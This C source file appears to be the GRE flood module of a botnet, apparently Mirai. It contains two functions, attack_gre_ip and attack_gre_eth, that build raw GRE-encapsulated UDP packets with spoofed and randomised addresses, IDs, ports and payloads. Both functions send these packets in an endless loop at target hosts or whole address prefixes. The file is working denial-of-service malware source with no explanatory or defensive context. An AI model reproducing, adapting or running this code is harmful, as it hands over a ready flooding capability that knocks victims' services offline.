#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "util.h"
#include "checksum.h"
#include "rand.h"

void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        // GRE header init
        greh->protocol = htons(ETH_P_IP); // Protocol is 2 bytes

        // Encapsulated IP header init
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}

void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *ethh;
        struct iphdr *greiph;
        struct udphdr *udph;
        uint32_t ent1, ent2, ent3;

        pkts[i] = calloc(1510, sizeof (char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        ethh = (struct ethhdr *)(greh + 1);
        greiph = (struct iphdr *)(ethh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        // GRE header init
        greh->protocol = htons(PROTO_GRE_TRANS_ETH); // Protocol is 2 bytes

        // Ethernet header init
        ethh->h_proto = htons(ETH_P_IP);

        // Encapsulated IP header init
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if (dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct ethhdr *ethh = (struct ethhdr *)(greh + 1);
            struct iphdr *greiph = (struct iphdr *)(ethh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            uint32_t ent1, ent2, ent3;

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            ent1 = rand_next();
            ent2 = rand_next();
            ent3 = rand_next();
            util_memcpy(ethh->h_dest, (char *)&ent1, 4);
            util_memcpy(ethh->h_source, (char *)&ent2, 4);
            util_memcpy(ethh->h_dest + 4, (char *)&ent3, 2);
            util_memcpy(ethh->h_source + 4, (((char *)&ent3)) + 2, 2);

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}
